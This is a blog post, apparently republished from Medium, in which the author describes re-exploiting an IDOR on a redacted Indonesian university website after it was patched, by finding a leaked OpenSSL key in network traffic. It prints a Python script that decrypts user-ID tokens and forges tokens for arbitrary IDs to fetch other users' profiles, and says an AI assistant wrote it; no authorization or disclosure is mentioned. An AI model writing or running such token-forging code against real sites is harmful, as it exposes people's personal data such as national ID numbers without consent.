# The Story of How I Hacked an International University in Indonesia AGAIN

- **Source URL:** https://christmex.medium.com/the-story-of-how-i-hacked-an-international-university-in-indonesia-again-57b4fef9fbd8
- **Fetched from:** https://osintteam.blog/the-story-of-how-i-hacked-an-international-university-in-indonesia-again-57b4fef9fbd8?source=rss-fd8540e08e1e------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14910 (id 14910)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** JC / Mon, 14 Sep 2026 05:35:50 GMT

Zup folks, it’s me.

So, around 4:33 PM, I was just chilling and waiting for Claude to finish up a task. Since I had nothing to do 😙, I randomly decided to revisit a website that I hacked a while ago the one I already wrote a write-up about \[[https://infosecwriteups.com/the-story-of-how-i-hacked-an-international-university-in-indonesia-ec819a8c8fc0](https://infosecwriteups.com/the-story-of-how-i-hacked-an-international-university-in-indonesia-ec819a8c8fc0)\].

When I checked it again, it turned out they had already patched the IDOR bug. Okay, interesting. I wanted to see how far they actually went to fix it.

As usual, I opened up Temp-Mail and registered two accounts to compare them. After successfully creating both, I noticed that sensitive data like NIK (National ID Number) is still saved directly in the database as is, without any unique validation. I tried registering the exact same NIK on both accounts, and the system accepted it without a single complaint.

Another bug I found right away is that the account confirmation token had no expiration date validation at all.

Moving on, after logging into one of my newly created accounts, I opened the network panel to analyze all the incoming and outgoing requests. The website is built using Next.js, and as we all know, if requests happen on the client-side without proper protection, we can easily peek at what’s going on inside 😙.

During my inspection, I noticed a specific request used to fetch the profile information of the currently logged-in user. However, the endpoint format had changed since my last write-up.

// before (plain id)

https://redacted.ac.id/api/user/profil/\[1/2/3\]

// after (chipertext)

https://redacted.ac.id/api/user/profil/\[chipertext\]

Seeing the ciphertext in the URL made me think, *“Ah fuck, looks like I can’t mess with it anymore 🥲.”* It actually looked pretty decent since it wasn’t an ordered sequential ID anymore. But after doing some quick research, I realized the ciphertext format strongly resembled **OpenSSL Password-Based Encryption**.

I dug deeper into how OpenSSL Password-Based Encryption works and learned that to generate or crack it, you absolutely need the secret key. So, I asked an AI to whip up a simple Python script to generate the ciphertext.

Armed with my two test accounts, I tried extracting data from both to find a pattern. Based on experience, I guessed that the raw user ID was the data being converted into the ciphertext. However, without the secret key, I couldn’t do a mirror generation to verify this.

The next step was to perform a deep dive analysis of all the network logs on the website, hoping that luck was still on my side. And then, in one of the requests, I found a needle in a haystack 🤩.

Yep, there it was, the secret key 😈. Time to cook fellas.

I also noticed in one of the requests that we could fetch user information using a curl command like this:

curl --url 'https://redacted.ac.id/api/user/profil/\[chiperteks\]' \

-H 'accept: application/json, text/plain, \*/\*' \

-H 'accept-language: en-US,en;q=0.9' \

-H 'authorization: redacted' \

//.....

Based on that, I asked AI to write a Python script to handle the ciphertext generation. Since I had two accounts, I used their respective ciphertexts for simulation to see if my locally generated hashes matched the target system’s output.

import base64

import subprocess

KEY = "redacted\_secret\_key"

def \_openssl(raw\_bytes, encrypt):

args = \["openssl", "enc", "-aes-256-cbc", "-md", "md5", "-k", KEY\]

args.append("-e" if encrypt else "-d")

result = subprocess.run(args, input=raw\_bytes, capture\_output=True)

if result.returncode != 0:

raise ValueError(result.stderr.decode(errors="replace").strip())

return result.stdout

def to\_url\_safe(standard\_b64):

return standard\_b64.replace('+', '-').replace('/', '\_').rstrip('=')

def from\_url\_safe(token):

standard = token.replace('-', '+').replace('\_', '/')

return standard + '=' \* (-len(standard) % 4)

def encrypt\_id(target\_id):

raw\_output = \_openssl(str(target\_id).encode('utf-8'), encrypt=True)

return to\_url\_safe(base64.b64encode(raw\_output).decode('ascii'))

def decrypt\_id(token):

raw\_data = base64.b64decode(from\_url\_safe(token))

if raw\_data\[:8\] != b"Salted\_\_":

return "!OpenSSL!"

try:

return \_openssl(raw\_data, encrypt=False).decode('utf-8', errors='replace')

except ValueError as error:

return f"fail: {error}"

if \_\_name\_\_ == "\_\_main\_\_":

print("--- 1. Verif ---")

for token in (

"first\_account\_chiperteks",

"second\_account\_chiperteks",

):

print(f" {token} -> id {decrypt\_id(token)}")

print("\n--- 2. FORGE ID TARGET ---")

for target\_id in (1, 2, 3, 100, 210, 211, 212, 213):

token = encrypt\_id(target\_id)

print(f" id {target\_id:>4} -> /api/user/profil/{token}")

print("\n Round-trip check:",

decrypt\_id(encrypt\_id(1)))

After running the script, the results were exactly what I hoped for. The secret key I found was 100% valid and could successfully encrypt and decrypt user IDs. With this, I was back in business, able to pull off the exact same IDOR exploitation scenario from my very first write-up.

**What can we learn from this story?**

2\. Use Claude or any AI assistant when you’re working, so when you get bored, you can find bugs on someone’s website instead 😏.

3\. When building a system, actually understand best practices and how your tech stack handles data security under the hood.

[The Story of How I Hacked an International University in Indonesia AGAIN 🤫](https://osintteam.blog/the-story-of-how-i-hacked-an-international-university-in-indonesia-again-57b4fef9fbd8) was originally published in [OSINT Team](https://osintteam.blog) on Medium, where people are continuing the conversation by highlighting and responding to this story.
